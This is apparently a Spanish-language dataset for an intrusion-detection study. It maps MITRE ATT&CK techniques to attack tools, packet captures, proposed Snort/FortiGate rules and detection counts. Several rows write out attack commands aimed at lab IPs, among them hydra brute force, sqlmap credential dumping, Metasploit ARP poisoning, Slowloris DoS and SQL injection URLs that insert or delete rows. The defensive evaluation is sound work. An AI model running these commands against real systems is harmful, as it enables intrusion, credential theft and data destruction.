Reconnaissance;-;TA0043;Active Scanning;T1595;Vulnerability Scanning;T1595.002;Escaneo de vulnerabilidades;nmap;T1595.002-Port_Scanning_[3].pcapng;1;1000;0;SI;Regla genérica que detecte el envío de paquetes TCP con flag SYN activado a varios puertos diferentes;Ejecución de comando nmap para escaneo de puertos y detección de vulnerabilidades (nmap -sV --script vulscan IP);Manual [3] / 3.8.2;Manual [3] / 3.8.2.4;Manual [3] / 3.8.2.5;1;1;0;1;0;1;1;0.00;48;0.05;49;0.05;53;0.05;"""El ataque consiste en la ejecución de un comando nmap que escanea los 1000 puertos más comunes. Snort detecta que se esta realizando un analisis con nmap de puertos (SID 2009358) . Además, detecta posibles escaneo en diferentes rangos de puertos. Ejemplo: SID 2002910. Para el caso de FortiGate, sólo saltan 19 alertas, cada una avisando de un intento de descubrimiento de puerto particular""";19;0.02;1
Reconnaissance;-;TA0043;Active Scanning;T1595;Wordlist Scanning;T1595.003;Escaneo de página web;Dirb;T1595.003-Web_page_scanning1_[2].pcapng;1;101;0;SI;Regla genérica que detecte peticiones HTTP hacia muchas URLs diferentes con destino el mismo servidor;Ejecucion de comando dirb para escaneo de la estructura de directorios (dirb http://IP -w /usr/share/dirb/wordlist/vulns/apache.txt);Manual [2] / 3.1.1.1;Manual [2];Manual [2] / 4.1.1.1;1;1;0;1;0;1;0;0.00;0;0.00;0;0.00;0;0.00;El diccionario utilizado comprueba 101 rutas diferentes.;0;0.00;1
Reconnaissance;-;TA0043;Active Scanning;T1595;Wordlist Scanning;T1595.003;Escaneo de página web;GoBuster;T1595.003-Web_page_scanning2_[3].pcapng;1;4614;0;SI;Regla genérica que detecte peticiones HTTP hacia muchas URLs diferentes con destino el mismo servidor;Ejecucion de comando GoBuster para escaneo de la estructura de directorios;Manual [3] / 3.8.4;Manual [3] / 3.8.4.4;Manual [3] / 3.8.4.5;1;1;0;1;0;1;43;0.01;57;0.01;62;0.01;74;0.02;"""El diccionario utilizado comprueba 4614 rutas diferentes. Snort detecta el acceso e intento de acceso a diferentes rutas, lo que puede llegar a indicar un posible ataque de estas características pero no detectaría todas las rutas. Para el caso de FortiGate, tan sólo se detecta el intento concreto de acceder al fichero .htpasswd, lo cual sólo abarca una de las instancias""";1;0.00;1
Reconnaissance;-;TA0043;Search Open Technical Databases;T1596;DNS/Passive DNS;T1596.001;Transferencia de zona DNS;Dirb;T1596.001-DNS_Transfer_[2].pcapng;1;1;0;SI;"""Regla genérica que detecte paquetes TCP dirigidos al puerto 53 que tengan los bytes ""Question"" igual a 1 y el resto a cero. Además, el campo ""Type"" debe tomar el valor ""00 FC""""";Ejecución de comando para obtener informacion de la víctima (host -l javier.example.com IP);Manual [2] / 3.1.1.2;Manual [2];Manual [2] / 4.2.1.2;1;1;0;1;0;1;1;1.00;1;1.00;1;1.00;1;1.00;-;0;0.00;1
Reconnaissance;-;TA0043;Phishing for Information;T1598;Spearphishing Link;T1598.003;Recogida de información de la víctima mediante ingeniería social;SEToolKit;T1598.003_Spearphishing_Link_[5].pcapng;1;1;0;NO;Detección por listas negras/anomalías que permitan detectar tráfico de red correspondiente a correos electrónicos con enlaces maliciosos;"""Servidor de correo mediante Postfix, Thunderbird, Bind, Dovecot""";Manual [5] / 3.5.1.1;Manual [5];;1;1;0;1;0;1;0;0.00;0;0.00;0;0.00;0;0.00;-;0;0.00;0
Reconnaissance;-;TA0043;Gather Victim Identity Information;T1589;Email Addresses;T1589.002;Recogida de cuentas de correo eléctronico y validación de las mismas;"""theHarvester, bulk-email-verifier""";T1589.002-Gather_victim_identity_information_[4].pcapng;1;1;0;SI;"""Regla genérica que detecte un número elevado de intentos de conexión y mensajes ehlo SMTP procedentes de un mismo origen hacia un servidor, con diferentes destinatarios.""";-;Manual [4] / 3.1;Manual [4] / B.1;Manual [4] / 4.1;1;1;0;1;0;1;0;0.00;0;0.00;0;0.00;0;0.00;-;0;0.00;1
Resource Development;-;TA0042;Compromise Accounts;T1586;Social Media Accounts;T1586.001;Fuerza bruta para acceso a web;Hydra;T1586.001_[2].pcapng;1;1;0;SI;Regla genérica que detecte el envío de una contraseña sobre el cuerpo de una petición HTTP POST.;"Ataque de fuerza bruta a formulario de acceso a página web phpMyAdmin. Comando: hydra -l root -P /usr/share/john/password.lst 192.168.2.2 http-post-form ""/phpmyadmin/index.php:pma_username=^USER^&pma_password=^PASS^:#1045 Cannot log in to the MySQL server""";Manual [2] / 3.1.2.1;Manual [2];Manual [2] / 4.2.1.3;1;1;0;1;0;1;0;0.00;0;0.00;0;0.00;0;0.00;-;1;1.00;1
Resource Development;-;TA0042;Establish Accounts;T1585;Social Media Accounts;T1585.001;Creación de cuentas de redes sociales;"""Sitios web convencionales (Facebook, Github, Microsoft ...)""";T1585.001-Establish_social_accounts_[4].pcapng;1;1;0;NO;"""Siempre y cuando el origen sea la red a proteger, detección por anomalías que identifique un incipiente aumento de las peticiones a servidores de redes sociales.""";-;Manual [4] / 3.2;Manual [4] / B.2;Manual [4] / 4.2;1;1;0;1;0;1;0;0.00;0;0.00;0;0.00;0;0.00;-;0;0.00;0
Resource Development;-;TA0042;Compromise Infrastructure;T1584.002;DNS Server;T1584.002;Envenenamiento de Caché DNS;ettercap;T1584-Cache_dns_[1].pcapng;1;1;0;NO;"""Una vez el servidor DNS se encuentra comprometido, no es posible determinar si las redirecciones basadas en una caché envenenada son maliciosas o no""";-;Manual [1] / 2.4.1.1.5;Manual [1] / E.16;-;1;0;0;1;0;1;0;0.00;0;0.00;0;0.00;0;0.00;-;0;0.00;0
Resource Development;-;TA0042;Compromise Infrastructure;T1584.002;DNS Server;T1584.002;Secuestro / Redireccionamiento DNS;ettercap;T1584-Secuestro_dns_[1].pcapng;1;1;0;NO;"""Una vez el servidor DNS se encuentra comprometido, no es posible determinar si las redirecciones basadas en una caché envenenada son maliciosas o no""";-;Manual [1] / 2.4.1.1.4;Manual [1] / E.15;-;1;0;0;1;0;1;0;0.00;0;0.00;0;0.00;0;0.00;-;0;0.00;0
Resource Development;-;TA0042;Compromise Infrastructure;T1584.005;Botnet;T1584.005;Uso de Botnet;"""Ares, Screenshot and key logging""";T1584.005-C2018_[6].pcapng;1;1;0;NO;"""La detección debe centrarse en otras fases del ciclo de vida de un ataque, como Phishing, DDoS…""";Uso de Ares y screenshots y key logging https://www.unb.ca/cic/datasets/ids-2018.html;Dataset CIC-2018;Dataset CIC-2018;Dataset CIC-2018;1;0;0;1;0;1;0;0.00;0;0.00;0;0.00;0;0.00;-;0;0.00;0
Initial Access;Persistence;TA0001;External Remote Services;T1133;-;-;Acceso a red VPN desde dispositivo no autorizado con credenciales robadas;OpenVPN;T1133-External_remote_services_[4].pcapng;1;1;0;NO***;"""Existen varias variantes.
 Circunstancias concretas del ataque: el atacante realiza alguna interacción posterior una vez ha logrado acceder a la red (aplicable a esta técnica) como un escaneo de red o mensajes de anuncio de Host.
 Reglas personalizadas: regla que compruebe si las direcciones IP involucradas en los paquetes se corresponden con las autorizadas dentro de la red VPN (debe ser configurada manualmente).""
";"""Acceso a red VPN, sin interacciones adicionales más allá de las naturales al propio acceso""";Manual [4] / 3.3;Manual [4] / B.3;Manual [4] / 4.3;1;1;0;1;0;1;0;0.00;0;0.00;1;1.00;1;1.00;-;0;0.00;1
Initial Access;-;TA0001;Exploit Public-Facing Application;T1190;-;-;Inyección SQL;Sqlmap;T1190-Sql_inyection1_[3].pcapng;1;1;0;SI;"""Regla que detecte un posible intento al esquema de informacion de un servidor MySQL. Regla que detecte una sentencia SQL pudiendose tratar de una posible inyeccion SQL. Regla que detecte posible escaneo de vulnerabilidades de inyeccion SQL.""";"""Ejecucion de comando mediante sqlmap para probar diferentes SQL Injections a una página web. Comando: sqlmap -u http://192.168.2.2/payroll_app.php --forms --batch --passwords""";Manual [3] / 3.8.5;Manual [3] / 3.8.5.4;Manual [3] / 3.8.5.5;1;1;0;1;0;1;0;0.00;0;0.00;0;0.00;0;0.00;-;1;1.00;1
Initial Access;-;TA0001;Exploit Public-Facing Application;T1190;-;-;Inyección SQL;Sqlmap;T1190-Sql_inyection2_[2].pcapng;1;76;0;SI;Regla que detecte un posible intento al esquema de informacion de un servidor MySQL. Regla que detecte una sentencia SQL pudiendose tratar de una posible inyeccion SQL. Regla que detecte posible escaneo de vulnerabilidades de inyeccion SQL.;Ejecucion de comando mediante sqlmap para probar diferentes SQL Injections a una página web. Comando: sqlmap -u http://192.168.2.2/payroll_app.php --forms --batch --passwords;Manual [2] / 3.1.3.1;Manual [4] / B.28;Manual [2] / 4.1.1.2;1;1;0;1;0;1;76;1.00;76;1.00;76;1.00;76;1.00;"""FG - Las dos primeras inyecciones SQL generan una alerta, el resto 2""";76;1.00;1
Initial Access;-;TA0001;Exploit Public-Facing Application;T1190;-;-;Inyección SQL;Damn Vulnerable Web App (DVWA);T1190-Sql_injection-C2018_[6].pcapng;1;1;0;NO*;Regla personalizada que detecte posibles cadenas asociadas a un ataque de inyección SQL en sentencias HTML;-;Dataset CIC-2018;Manual [4] / B.34;Dataset CIC-2018;1;1;0;1;0;1;0;0.00;0;0.00;0;0.00;0;0.00;-;1;1.00;1
Initial Access;-;TA0001;Drive-by Compromise;T1189;-;-;HTML Exploit I - HTML Compilador;"""Apache, Shadyantra""";T1189-Drive-by_compromise_v1_[4].pcapng;1;1;0;NO**;"""La detección de esta técnica será más o menos viable dependiendo del objetivo y método del atacante. Si el foco está fijado en la obtención de credenciales, si el ataque está elaborado resulta prácticamente imposible su detección. En caso de que se busque un acceso a la red de manera directa mediante ejecutables y/o malware, el tipo de contenido marcará su grado de detección.""";Carga de página web con exploit HTML para compilar código malware (no ejecutar);Manual [4] / 3.4;Manual [4] / B.4;Manual [4] / 4.4;1;1;0;1;0;1;0;0.00;0;0.00;0;0.00;0;0.00;-;1;1.00;1
Initial Access;-;TA0001;Drive-by Compromise;T1189;-;-;HTML Exploit II - Descarga de Ejecutable;"""Apache, Shadyantra""";T1189-Drive-by_compromise_v2_[4].pcapng;1;1;0;NO**;"""La detección de esta técnica será más o menos viable dependiendo del objetivo y método del atacante. Si el foco está fijado en la obtención de credenciales, si el ataque está elaborado resulta prácticamente imposible su detección. En caso de que se busque un acceso a la red de manera directa mediante ejecutables y/o malware, el tipo de contenido marcará su grado de detección.""";Carga de página web con exploit HTML para descargar malware en formato ejecutable .exe;Manual [4] / 3.4;Manual [4] / B.4;Manual [4] / 4.4;1;1;0;1;0;1;0;0.00;0;0.00;0;0.00;0;0.00;-;0;0.00;1
Initial Access;-;TA0001;Hardware Additions;T1200;-;-;Añadir hardware;SSH Server + USB(Simular USB con MV con SO);T1200-Hardware_Additions_[5].pcapng;1;1;0;NO;"""Detección por anomalías que identifique desviaciones en el tráfico de red, tales como metadatos o protocolos de gestión (DHCP,...) fuera de los habituales""";"""Aparición de una nueva MV en el entorno de la víctima simulando la insercion de un USB tipo Pwn Plug que se utiliza como nodo de acceso a la red de la víctima para posteriormente, aprovechando que el puerto de la víctima esta abierto, acceder al equipo.""";Manual [5] / 3.5.2.1;Manual [5];;1;1;0;1;0;1;0;0.00;0;0.00;0;0.00;0;0.00;-;0;0.00;0
Initial Access;-;TA0001;Phishing;T1566;Spearphishing Attachment;T1566.001;Envío de emails con documentos maliciosos;-;T1566.001-C2018_[6].pcapng;1;1;0;NO*;"""Si los mensajes contienen determinados patrones como intentos de creación de Shells remotos sí que pueden ser detectados porl los cortafuegos en base a reglas que detecten cadenas específicas en los paquetes""";-;Dataset CIC-2018;Dataset CIC-2018;Dataset CIC-2018;1;1;0;1;0;0;1;1.00;1;1.00;1;1.00;1;1.00;-;1;1.00;1
Initial Access;-;TA0001;Phishing;T1566;Spearphishing Link;T1566.002;Obtener un acceso inicial mediante ingeniería social utilizando un enlace adjunto en un correo que descargue un fichero que establezca una sesión al equipo víctima;"""SEToolKit, Metasploit""";T1566.002-Spearphishing_Link_[5].pcapng;1;1;0;NO;"""Detección por listas negras/anomalías que permitan detectar tráfico de red correspondiente a correos electrónicos con enlaces maliciosos que contengan contenido malware""";"""Servidor de correo mediante Postfix, Thunderbird, Bind, Dovecot""";Manual [5] / 3.5.2.2;Manual [5];;1;1;0;1;0;1;0;0.00;0;0.00;0;0.00;0;0.00;-;0;0.00;0
Initial Access;Command and Control;TA0001;Content Injection;T1659;-;-;"""Realizar una suplantación de identidad DHCP, saturando el servidor DHCP verdadero para que el servidor DHCP del atacante procese las consultas de un usuario. Posteriormente se manipula alguna consulta inyectando contenido malicioso""";"""dhcpstarv, Metasploit""";T1659-Content_Injection_[5].pcapng;1;1;0;SI;"""La detección de esta técnica será más o menos viales dependiendo del objetivo y método del atacante. Si el ataque se realiza en conjunto con protocolos de gestion(DHCP) dificultará la detección. Resultará necesario monitorizar por la distribución a traves del tráfico de red de archivos malware""";Suplantacion de identidad de DHCP Server para posteriormente inyectar contenido en la víctima con malware;Manual [5] / 3.5.2.3;Manual [5];;1;1;0;1;0;1;0;0.00;0;0.00;0;0.00;0;0.00;-;0;0.00;1
Initial Access;Command and Control;TA0001;Content Injection;T1659;-;-;Inyección;Suite aircrack-ng;T1659_Inyeccion_[1].pcapng;1;1;0;NO;"""Detección por anomalías, paquetes sospechosos de haber sido generados aleatoriamente y sin correlación con las comunicaciones establecidas.""";-;Manual [1] / 2.5.1.1.4;Manual [1] / E.23;-;1;1;0;1;0;1;0;0.00;0;0.00;0;0.00;0;0.00;-;0;0.00;0
Initial Access;-;TA0001;Trusted Relationship;T1199;-;-;Uso de una conexión RDP sin proteger para el acceso a un equipo;RDP;T1199-Trusted_relationship_[4].pcapng;1;1;0;SI*;"""El ataque tiene un matiz clave. Si bien el ataque puede ser detectado por Snort (existen muchas variantes, aunque para esta instancia concreta, por ejemplo, sí que existe mecanismo de detección), el hecho de que se trate de un ataque procedente de un dominio de confianza infectado, dificulta su detección, pues bloquear estos paquetes podría imposibilitar comunicación con el dominio de confianza si no existiera amenaza""";-;Manual [4] / 3.5;Manual [4] / B.5;Manual [4] / 4.5;1;1;0;1;0;1;0;0.00;0;0.00;0;0.00;1;1.00;-;0;0.00;1
Persistence;-;TA0003;Browser Extensions;T1176;-;-;Instalación de Plugin en Navegador Chrome que reenvía información relacionada con búsquedas del usuario a un servidor;Malicious-Browser-Extension;T1176-Browser-extension_[4].pcapng;1;1;0;NO;"""Detección por anomalías basada en flujos de datos hacia direcciones no relacionadas con las búsquedas, normalmente en formato de objetos JavaScript""";-;Manual [4] / 3.7;Manual [4] / B.7;Manual [4] / 4.7;1;1;0;1;0;1;0;0.00;0;0.00;0;0.00;0;0.00;-;0;0.00;0
Persistence;Defense Evasion;TA0003;BITS Jobs;T1197;-;-;Establecimiento de tarea BITS en equipo Windows para garantizar persistencia trás reinicio del equipo;"""BITSADMIN,METASPLOIT""";T1197-BITS_Jobs_[5].pcapng;1;1;0;NO**;Se pueden monitorizar conexiones nuevas generadas por BITS;Ejecución de comandos para la creación de una tarea BITS con rastro de red;Manual [5] / 3.5.3.1;Manual [5];;1;1;0;1;0;1;0;0.00;0;0.00;0;0.00;0;0.00;-;0;0.00;1
Persistence;Defense Evasion;TA0003;Pre-OS Boot;T1542;TFTP Boot;T1542.005;Modificación de imagen de SO mediante la suplantación de un Server TFTP;SSH;T1542.005-TFTP_Boot_[5].pcapng;1;1;0;NO***;**Regla personalizada que comprueba si la IP del servidor TFTP es la del servidor legítimo ** Que el SO enviado por el atacante contenga algun tipo de malware detectable por un IDS;Servidor TFTP utilizando Iventoy;Manual [5] / 3.5.3.2;Manual [5];;1;1;0;1;0;1;0;0.00;0;0.00;0;0.00;0;0.00;-;0;0.00;1
Persistence;-;TA0003;Server Software Component;T1505;SQL Stored Procedures;T1505.001;Inyección SQL;None (SQL injection using URL);T1505.001-SQL_inyection_[].pcapng;1;1;0;NO***;"**Regla genérica que detecte en la petición ""%27"" que indica la representacion de comillas simples";"Ejecución de URL en navegador web (http://172.16.2.2:8080/contacto?apellidos=Fernandez%27;%20INSERT%20INTO%20contactos%20values%20(3,%20%27Atacante%27,%20%27Atacante%27,%20%27Atacante%27,%20100)--)";Manual [3] / 3.8.7;Manual [3] / 3.8.7.4;Manual [3] / 3.8.7.5;1;1;0;1;0;1;0;0.00;1;1.00;1;1.00;1;1.00;-;1;1.00;1
Persistence;-;TA0003;Server Software Component;T1505;Web Shell;T1505.003;Shell Web;Metasploit;T1505.005-Shell_Web_[2].pcapng;1;1;0;SI;Regla genérica que detecta el intento de escaneo para comprobar la existencia de backdoor.;"El ataque busca aprovechar configuracion vulnerable de un servidor WampServer que permite subir y borrar contenido web mediante el uso de HTTP PUT y HTTP DELETE.
Se realiza la subida de un payload a un servidor web";Manual [2] / 3.1.5.1;Manual [2];-;1;1;0;1;0;1;0;0.00;0;0.00;1;1.00;1;1.00;-;0;0.00;1
Credential Access;-;TA0006;Brute Force;T1110;Password Guessing;T1110.001;Obtención de contraseña por fuerza bruta (adivinación);Hydra;T1110.001-Hydra_[3].pcapng;1;1;0;NO;-;Obtener la contraseña para conectarse por SSH al equipo victima mediante fuerza bruta. Comando: hydra -l dit -P pass.txt 172.16.2.2 -t 4 ssh;Manual [3] / 3.8.9;Manual [3] / 3.8.9.4;Manual [3] / 3.8.9.5;1;0;0;1;0;1;0;0.00;0;0.00;0;0.00;0;0.00;-;0;0.00;0
Credential Access;-;TA0006;Brute Force;T1110;Password Guessing;T1110.001;Obtención de contraseña por fuerza bruta (adivinación);FTP - Patator;T1110.001-FTP-C2018_[6].pcapng;1;1;0;SI;Regla genérica que detecte un elevado número de intentos de acceso a un servicio;-;Dataset CIC-2018;Manual [4] / B.32;Dataset CIC-2018;1;1;0;1;0;1;0;0.00;0;0.00;0;0.00;0;0.00;-;0;0.00;1
Credential Access;-;TA0006;Brute Force;T1110;Password Guessing;T1110.001;Obtención de contraseña por fuerza bruta (adivinación);SSH - Patator;T1110.001-SSH-C2018_[6].pcapng;1;1;0;SI;Regla genérica que detecte un elevado número de intentos de acceso a un servicio;-;Dataset CIC-2018;Manual [4] / B.33;Dataset CIC-2018;1;1;0;1;0;1;0;0.00;0;0.00;1;1.00;1;1.00;-;0;0.00;1
Credential Access;-;TA0006;Brute Force;T1110;Password Guessing;T1110.001;Ataque sobre WPS;"""wash, reaver""";T1110-Wps_[1].pcapng;1;1;0;NO;-;-;Manual [1] / 4.2.8;Manual [1] / E.27;Manual [4] / 4.1.34;1;0;0;1;0;1;0;0.00;0;0.00;0;0.00;0;0.00;-;0;0.00;0
Credential Access;-;TA0006;Brute Force;T1110;Password Spraying;T1110.003;Ataque de fuerza bruta basado en diccionario de contraseñas;wifite;T1110-Diccionario_[1].pcapng;1;1;0;NO;-;-;Manual [1] / 4.2.7;Manual [1] / E.26;Manual [4] / 4.2.31;1;0;0;1;1;1;0;0.00;0;0.00;0;0.00;0;0.00;-;0;0.00;0
Credential Access;-;TA0006;Brute Force;T1110;Password Cracking;T1110.002;Ataque PMKID;"""hashcat, hcxpcapngtool, hcxdumptool""";T1110-pmkid_[1].pcapng;1;1;0;NO;-;-;Manual [1] / 4.2.6.3;Manual [1] / E.25;Manual [4] / 4.2.32;1;0;0;1;1;1;0;0.00;0;0.00;0;0.00;0;0.00;-;0;0.00;0
Credential Access;-;TA0006;Brute Force;T1110;Password Cracking;T1110.002;PTW/KoreK/FMS;Suite aircrack-ng;T1110-Ptw_korek_[1].pcapng;1;1;0;NO;-;-;Manual [1] / 4.2.5;Manual [1] / E.24;Manual [4] / 4.1.33;1;0;0;1;1;1;0;0.00;0;0.00;0;0.00;0;0.00;-;0;0.00;0
Credential Access;Discovery;TA0006;Network Sniffing;T1040;-;-;Falsa autenticación;Suite aircrack-ng;T1040-Autenticacion_[1].pcapng;1;1;0;NO;No existe detección posible ante este tipo de ataques. El uso de cifrado WEP incorpora vulnerabilidades intrínsecas a este.;-;Manual [1] / 4.2.1;Manual [1] / E.20;Manual [4] / 4.1.26;1;0;0;1;1;1;0;0.00;0;0.00;0;0.00;0;0.00;-;0;0.00;0
Credential Acess;Discovery;TA0006;Network Sniffing;T1040;-;-;ChopChop;Suite aircrack-ng;T1040-Chopchop_[1].pcapng;1;1;0;NO;No existe detección posible ante este tipo de ataques. El uso de cifrado WEP incorpora vulnerabilidades intrínsecas a este.;-;Manual [1] / 4.2.2;Manual [1] / E.21;Manual [4] / 4.1.27;1;0;0;1;1;1;0;0.00;0;0.00;0;0.00;0;0.00;-;0;0.00;0
Credential Access;Discovery;TA0006;Network Sniffing;T1040;-;-;Fragmentación;Suite aircrack-ng;T1040-Fragmentacion_[1].pcapng;1;1;0;NO;No existe detección posible ante este tipo de ataques. El uso de cifrado WEP incorpora vulnerabilidades intrínsecas a este.;-;Manual [1] / 4.2.3;Manual [1] / E.22;Manual [4] / 4.1.28;1;0;0;1;1;1;0;0.00;0;0.00;0;0.00;0;0.00;-;0;0.00;0
Credential Access;Discovery;TA0006;Network Sniffing;T1040;-;-;Inundación MAC;Suite aircrack-ng;T1040-Mac_flood_[1].pcapng;1;1;0;NO*;"""Regla personalizada que detecte un envío masivo de mensajes IPv4 con direcciones incorreladas con la red a proteger, y que aparenten ser completamente aleatorias""";-;Manual [1] / 3.2;Manual [1] / E.1;Manual [4] / 4.1.29;1;1;0;1;1;1;0;0.00;0;0.00;0;0.00;0;0.00;-;0;0.00;0
Credential Access;Collection;TA0006;Adversary-in-the-Middle;T1557;ARP Cache Poisoning;T1557.002;Envenenamiento ARP;Arpspoof;T1557.002-ARP_poisoning1_[2].pcapng;1;1;0;NO;-;Envenenamiento de tablas ARP mediante Arpspoof.;Manual [2] / 3.4.1.1;Manual [2];-;1;1;0;1;0;1;0;0.00;0;0.00;0;0.00;0;0.00;-;0;0.00;0
Credential Access;Collection;TA0006;Adversary-in-the-Middle;T1557;ARP Cache Poisoning;T1557.002;Envenenamiento ARP;Metasploit;T1557.002-ARP_poisoning2_[3].pcapng;1;1;0;NO;-;"""Se realiza un ataque MITM, mediante el envenanamiento de las tablas de ARP caché de un equipo y su gateway. De esta toda se redirige todo el tráfico para que pase a través del equipo del atacante. Comando: msfconsole -x ""use auxiliary/spoof/arp/arp_poisoning; set BIDIRECTIONAL true; set interface eth1; set DHOSTS 192.168.1.2; set SHOSTS 192.168.1.1; run -j -z; sleep 5; kill 0; exit""""";Manual [3] / 3.8.19;Manual [3] / 3.8.19;Manual [3] / 3.8.19.5;1;1;0;1;1;1;0;0.00;0;0.00;0;0.00;0;0.00;-;0;0.00;0
Credential Access;Collection;TA0006;Adversary-in-the-Middle;T1557;ARP Cache Poisoning;T1557.002;Suplantación ARP;arpspoof;T1557-Arp_spoof_[1].pcapng;1;1;0;SI;"""Mediante el uso de preprocesadores, la detección de este ataque es posible estableciendo un asociación entre la IP a proteger y su dirección MAC correspondiente. De esta forma, se puede fundar una regla que detecte mensajes ARP que incumplen esta asociación y que avistan de un posible ataque por suplantación MAC""";-;Manual [1] / 3.2;Manual [1] / E.3;-;1;1;0;1;0;1;0;0.00;0;0.00;0;0.00;0;0.00;-;0;0.00;1
Credential Access;Collection;TA0006;Adversary-in-the-Middle;T1557;DHCP Spoofing;T1557.003;DHCP Spoofing;"""DHCPig, servidor DHCP""";T1557-Dhcp_spoofing_[1].pcapng;1;1;0;SI;"""Regla genérica que detecte un envío masivo de procedimientos DHCP completos (DISCOVERY, OFFER, REQUEST, ACK). Otra alternativa es una regla personalizada que analice mensajes DHCP ACK con direcciones IP de servidores DNS distinta a la establecida en la red""";-;Manual [1] / 2.4.2.1.2;Manual [1] / E.19;-;1;1;0;1;0;1;0;0.00;0;0.00;0;0.00;0;0.00;-;0;0.00;1
Credential Access;Collection;TA0006;Adversary-in-the-Middle;T1557;ARP Cache Poisoning;T1557.002;Agujero 196;ettercap;T1557-Hole196_[1].pcapng;1;1;0;SI;"""Mediante el uso de preprocesadores, la detección de este ataque es posible estableciendo un asociación entre la IP a proteger y su dirección MAC correspondiente. De esta forma, se puede fundar una regla que detecte mensajes ARP que incumplen esta asociación y que avistan de un posible ataque por suplantación MAC""";-;Manual [1] / 2.1.2.1.1;Manual [1] / E.28;-;1;1;0;1;0;1;0;0.00;0;0.00;0;0.00;0;0.00;-;0;0.00;1
Credential Access;Collection;TA0006;Adversary-in-the-Middle;T1557;-;-;Suplantación del puente raíz;yersinia;T1557-Puente_raiz_[1].pcapng;1;1;0;NO**;"""Si el ataque viene seguido de suplantaciones ARP, con el uso de preprocesadores de Snort resulta posible su detección. En caso de que el ataque se centre únicamente en el establecimiento del atacante como puente raíz, no existe mecanismo de detección""";Establecimiento de atacante como puente raíz;Manual [1] / 2.1.4.1.2;Manual [1] / E.6;-;1;1;0;1;0;1;0;0.00;0;0.00;0;0.00;0;0.00;-;0;0.00;1
Credential Access;Collection;TA0006;Adversary-in-the-Middle;T1557;-;-;Redirección;"""ettercap, netwox""";T1557-Redireccion_[1].pcapng;1;1;0;NO**;Regla personalizada que detecte envío de paquetes ICMP Redirect por parte de un equipo que no debería intervenir en labores de redirección;-;Manual [1] / 2.2.2.1.3;Manual [1] / E.8;-;1;1;0;1;0;1;0;0.00;0;0.00;0;0.00;1;1.00;-;0;0.00;1
Credential Access;-;TA0006;Forced Authentication;T1187;-;-;Forzar intento de autenticación en un servidor para obtener credenciales de acceso;"""SMB, NTLMssp-Extract""";"""T1187-Forced_Authentication_[5].pcapng, T1187-Forced_Authentication2_[5].pcapng""";1;3;0;SI;"""Monitorizar tráfico SMB en puertos TCP 139,445, puerto UDP 137 y tráfico WebDAV""";Servidor SMB. El atacante captura el tráfico de red del intento de autenticación mediante Wireshark y aplica fuerza bruta a las credenciales capturadas;Manual [5] / 3.5.5.1;Manual [5];;1;1;0;1;0;1;0;0.00;0;0.00;3;1.00;3;1.00;Cada instancia de ataque se corresponde con una solicitud al server SMB con el usuario y contraseñas en el paquete;0;0.00;1
Credential Access;-;TA0006;OS Credential Dumping;T1003;DCSync;T1003.006;Obtención de credenciales del usuario krbtgt (Usuario Kerberos Active Directory);mimikazt;T1003-Os_credential_dumping_dcsync_[4].pcapng;1;1;0;SI;Regla compuesta que detecte una llamada DCERPC Bind a la API DRSUAPI seguida de una llamada a la función DsGetNCChanges;-;Manual [4] / 3.11;Manual [4] / B.11;Manual [4] / 4.11;1;1;0;1;0;1;0;0.00;0;0.00;0;0.00;0;0.00;-;0;0.00;1
Collection;-;TA0009;Data from Configuration Repository;T1602;SNMP (MIB Dump);T1602.001;Recogida MIB de un equipamiento;Metasploit;T1602.001-MIB_Dump_[2].pcapng;1;1;0;SI;Regla genérica que detecte el uso del protocolo SNMP sobre UDP para acceder a la comunidad public;"""Este ataque obtiene informacion de la MIB de un equipo mediante peticiones SNMP. Comando: msfconsole -x ""use auxiliary/scanner/snmp/snmp_enum; set RHOSTS 192.168.2.2; run; exit""""";Manual [2] / 3.1.8.1;Manual [2];Manual [2] / 4.2.1.10;1;1;0;1;0;1;1;1.00;1;1.00;1;1.00;1;1.00;-;0;0.00;1
Collection;-;TA0009;Data from Information Repositories;T1213;-;-;Inyección SQL;Sqlmap;T1213-SQL_inyection_[3].pcapng;1;1;0;NO;-;Robar informacion de la victima obteniendo el contenido guardado en una tabla SQL. Comando: SELECT * FROM tabla;Manual [3] / 3.8.6;Manual [3] / 3.8.6.4;Manual [3] / 3.8.6.5;1;1;0;1;0;1;0;0.00;0;0.00;0;0.00;0;0.00;-;0;0.00;0
Collection;-;TA0009;Data from Network Shared Drive;T1039;-;-;Descarga de archivos de interés disponibles en una red compartida;Comando Net Use;T1039-Data_from_network_shared_drive_[4].pcapng;1;1;0;NO;"""Detección por anomalías, copia repentina de ficheros compartidos por red.""";-;Manual [4] / 3.15;Manual [4] / B.15;Manual [4] / 4.15;1;1;0;1;0;1;0;0.00;0;0.00;0;0.00;0;0.00;-;0;0.00;0
Collection;-;TA0009;Email Collection;T1114;Remote Email Collection;T1114.002;Recolección de correos electrónicos de un servidor Microsoft Exchange haciendo uso de credenciales robadas;PowerShell;T1114-Email_collection_remote_email_collection_[4].pcapng;1;1;0;NO;"""Detección por anomalías, peticiones LDAP espontáneas desde un equipo de la red, haciendo uso de una cuenta con credenciales válidas.""";-;Manual [4] / 3.16;Manual [4] / B.16;Manual [4] / 4.16;1;1;0;1;0;1;0;0.00;0;0.00;0;0.00;0;0.00;-;0;0.00;0
Impact;-;TA0040;Data Manipulation;T1565;Stored Data Manipulation;T1565.001;Inyección SQL;Sqlmap;T1565.001-SQL_inyection_[3].pcapng;1;1;0;NO***;"Reglas personalizadas que detecten ataques de inyeccion SQL mediante la presencia del caracter ""%27""";"""El objetivo es generar daño en la BBDD. Queremos borrar lineas de una tabla. Comando: http://172.16.2.2:8080/contacto?apellidos=Fernandez%27;%20DELETE%20FROM%20contactos%20WHERE%20num=3--""";Manual [3] / 3.8.8;Manual [3] / 3.8.8.4;Manual [3] / 3.8.8.5;1;1;0;1;0;1;0;0.00;1;1.00;1;1.00;1;1.00;-;1;1.00;1
Impact;-;TA0040;Endpoint Denial of Service;T1499;OS Exhaustion Flood;T1499.001;Denegación de servicio a servidor web;Metasploit;T1499.001-OS_Exhaustion_Flood_[3].pcapng;1;1;0;NO;-;Uso de metasploit para ataque DoS con herramienta Slowloris. Comando: use auxiliary/dos/http/slowloris;Manual [3] / 3.8.16;Manual [3] / 3.8.16.4;Manual [3] / 3.8.16.5;1;1;0;1;0;1;0;0.00;0;0.00;0;0.00;0;0.00;-;0;0.00;0
